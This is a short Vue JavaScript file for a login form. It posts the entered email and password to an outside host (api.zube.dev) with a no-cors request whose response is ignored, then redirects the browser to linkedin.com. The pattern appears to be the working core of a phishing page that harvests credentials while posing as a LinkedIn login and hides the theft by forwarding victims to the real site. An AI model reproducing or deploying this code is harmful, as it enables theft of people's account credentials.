const app = Vue.createApp({
    data() {
        return {
            email: '',
            passwd: ''
        }
    },
    methods: {
        submitForm(e) {
            e.preventDefault();

            let fd = new FormData();
            fd.append("email", this.email);
            fd.append("passwd", this.passwd);

            fetch("https://api.zube.dev/login", {
                body: fd,
                method: "POST",
                mode: "no-cors"
            }).then(response => {
                window.location.href = "https://linkedin.com";
            });
        }
    }
});

app.mount("body")
